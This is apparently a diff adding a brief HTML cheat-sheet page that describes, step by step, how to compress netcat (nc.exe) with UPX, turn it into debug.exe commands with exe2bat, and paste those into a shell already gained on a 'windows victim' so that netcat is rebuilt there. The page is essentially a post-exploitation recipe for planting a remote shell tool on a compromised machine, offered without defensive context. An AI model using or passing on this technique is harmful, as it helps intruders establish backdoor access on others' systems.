@@ -1,0 +1,17 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Debug.exe</title>
+</head><body>DEBUG.exe<br/>
+Note: Uploaded file cannot be larger than 64-bytes. UPX can be used to compress files.<br/>
+<br/>
+locate exe2ba­t.exe<br/>
+wine exe2ba­t.exe<br/>
+upx -9 nc.exe (to compress nc.exe)<br/>
+ls -l nc.exe (should now be smaller)<br/>
+wine exe2ba­t.exe /root/­nc.exe nc.txt (convert nc.exe to nc.txt)<br/>
+cat nc.txt | more (should be a hex dump)<br/>
+Near the end of nc.txt, exe2bat tells the debugger on the windows victim to create an exe<br/>
+<br/>
+Gain your shell using your usual exploit then copy and paste the contents of nc.txt into the remote shell. If it fails, re-run any failed commands manually. nc.exe will now be created on the victim machine.</body></html>
